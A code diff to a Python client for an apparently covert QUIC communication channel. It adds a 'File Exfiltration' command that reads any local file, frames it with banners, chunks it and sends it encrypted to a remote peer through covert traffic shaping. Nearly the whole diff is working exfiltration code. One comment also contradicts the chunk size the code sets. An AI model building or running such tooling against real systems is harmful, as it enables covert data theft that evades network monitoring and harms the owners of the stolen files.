@@ -193,6 +193,15 @@ class QuiCCli:
         self._traffic_thread = threading.Thread(target=_loop, name="quic-shaper")
         self._traffic_thread.start()
 
+    def _read_file_payload(self, filepath):
+        """Helper to read a file and return bytes for the payload."""
+        try:
+            with open(filepath, "rb") as f:
+                return f.read()
+        except Exception as e:
+            print(f"[!] Error reading file: {e}")
+            return None
+
     def send_message(self, count):
         """
         Triggers 'count' QUIC connections.
@@ -213,46 +222,120 @@ class QuiCCli:
         if not cmd:
             return True
 
-        peer_meta = PEER_META.get(self.peer_key) if self.is_client else None
+        # 1. Connection Selection Safety
+        peer_keys = list(PEER_META.keys())
+        if not peer_keys:
+            print("[!] No active connection!")
+            return True
 
-        if cmd[0] == "m" and len(cmd) > 2 and cmd[1] == ":":
-            fec_rate = (
-                self.configuration.covert_fec_rate
-                if self.configuration.covert_strategy == "fec"
-                else None
-            )
+        if self.peer_key not in PEER_META:
+            self.peer_key = peer_keys[0]
 
-            # --- FIX: Buffer message if handshake isn't ready ---
-            if peer_meta.get("session_key") is None:
-                print("Handshake pending... buffering message.")
-                self._handshake_queue.append((cmd, fec_rate))
-                # Ensure the loop is running to flush this later
-                if self._traffic_thread is None or not self._traffic_thread.is_alive():
-                    self._start_traffic_loop()
-                return True
-            # ----------------------------------------------------
+        peer_meta = PEER_META[self.peer_key]
+        fec_rate = getattr(self.configuration, "covert_fec_rate", None)
 
-            # Just QUEUE the message.
+        # 2. Handshake Check
+        if peer_meta.get("session_key") is None:
+            print("Handshake pending... buffering message.")
+            self._handshake_queue.append((cmd, fec_rate))
+            if self._traffic_thread is None or not self._traffic_thread.is_alive():
+                self._start_traffic_loop()
+            return True
+
+        total_packets_queued = 0
+
+        # --- MODE 1: Text Message (m:Hello) ---
+        if cmd.startswith("m:") and len(cmd) > 2:
+            payload_bytes = cmd.encode("utf8")
+
             count = queue_message(
                 host_ip=self.host_ip,
-                payload=cmd.encode("utf8"),
+                payload=payload_bytes,
                 queue=peer_meta["cid_queue"],
                 public_key=peer_meta["public_key"],
                 sequence=self._next_sequence(),
                 session_key=peer_meta.get("session_key"),
                 fec_rate=fec_rate,
             )
+            total_packets_queued += count
 
-            if self.shaper_mode != "none":
-                print("Message queued. Transmission will be shaped.")
-            else:
-                # Immediate Send Mode
-                print(f"Message queued. Sending {count} packets immediately...")
-                self.send_message(count)
+        # --- MODE 2: File Exfiltration (f:secret.txt) ---
+        elif cmd.startswith("f:") and len(cmd) > 2:
+            filepath = cmd[2:].strip()
+            print(f"[*] Reading file '{filepath}' for exfiltration...")
 
+            raw_content = self._read_file_payload(filepath)
+
+            if raw_content:
+                # 1. Prepare Metadata
+                filename = os.path.basename(filepath)
+                name_bytes = filename.encode("utf-8")
+                banner = b"-----"
+
+                full_payload = (
+                    banner
+                    + b"BEGIN FILE: "
+                    + name_bytes
+                    + banner
+                    + b"\n"
+                    + raw_content
+                    + b"\n"
+                    + banner
+                    + b"END FILE: "
+                    + name_bytes
+                    + banner
+                    + b"\n"
+                )
+
+                # 2. Chunking (Keep strict 128 byte limit for FEC < 160)
+                CHUNK_SIZE = 150
+                total_len = len(full_payload)
+                chunks = [
+                    full_payload[i : i + CHUNK_SIZE]
+                    for i in range(0, total_len, CHUNK_SIZE)
+                ]
+
+                print(f"[*] Total: {total_len} bytes. Split into {len(chunks)} bursts.")
+
+                # 3. Queue Chunks
+                for i, chunk in enumerate(chunks):
+                    count = queue_message(
+                        host_ip=self.host_ip,
+                        payload=b"f" + chunk,
+                        queue=peer_meta["cid_queue"],
+                        public_key=peer_meta["public_key"],
+                        sequence=self._next_sequence(),
+                        session_key=peer_meta.get("session_key"),
+                        fec_rate=fec_rate,
+                    )
+                    total_packets_queued += count
+
+                    # Manual flush for 'none' shaper mode
+                    if self.shaper_mode == "none":
+                        self.send_message(50)
+                        import time
+
+                        time.sleep(0.5)
+
+                print(f"[+] Exfiltration of '{filename}' queued.")
+
+        # --- MODE 3: Quit ---
         elif cmd == "q":
             self.stop()
             return False
+
+        # --- SHARED: Feedback & Immediate Send ---
+        if total_packets_queued > 0:
+            if self.shaper_mode != "none":
+                print(
+                    f"Message(s) queued ({total_packets_queued} packets). Transmission will be shaped."
+                )
+            else:
+                if cmd.startswith("m:"):
+                    print(
+                        f"Message queued. Sending {total_packets_queued} packets immediately..."
+                    )
+                    self.send_message(total_packets_queued)
 
         return True
 
@@ -267,7 +350,7 @@ class QuiCCli:
         logger.info("QuiCCli stopped")
 
     def run_cli(self):
-        print("m:MSG | q")
+        print("m:MSG | f:FILE | q")
         while not self._stop_event.is_set():
             try:
                 cmd = input("> ").strip()
